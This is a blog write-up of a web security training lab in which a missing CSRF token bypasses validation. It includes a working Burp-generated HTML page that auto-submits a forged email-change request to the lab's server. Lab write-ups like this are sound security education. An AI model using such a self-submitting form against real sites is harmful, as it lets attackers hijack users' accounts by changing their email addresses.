---
layout: post
title:  "CSRF where token validation depends on token being present"
date:   2024-10-01 09:39:54 +0530
---

## Objective 

This lab's email change functionality is vulnerable to CSRF.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter` 

## Solution

Like the First CSRF lab which we solved is **"CSRF where token validation depends on request method"** here also looks the same where we have a **Email update** functionality and if we pass the values correctly, we will be responded with status code of `302`

![]({{ site.baseurl }}/assets/images/csrf-6.png) 

When I change something to the CSRF value like changing the last letter of value or something.. we will get an error like `Invalid CSRF token` 

![]({{ site.baseurl }}/assets/images/csrf-7.png) 

But what happens when we remove the entire token, think of it like `&csrf=guhoud09u` if I change something to their value it is validating based on the token and if the token isn't there it is not going to be validated.. So, I removed `&csrf=` entirely including the parameter and it worked.. request passes through and email got updated.. So it is vulnerable to a CSRF attack 

![]({{ site.baseurl }}/assets/images/csrf-8.png) 

Built a CSRF POC of the request using burpsuite and here is how it looks 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac400ed0306a804803f999e002600ec.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Post the exploit POC into the Exploit server body and then `store -> Deliver the exploit to victim` and which will solve our lab 

![]({{ site.baseurl }}/assets/images/csrf-9.png) 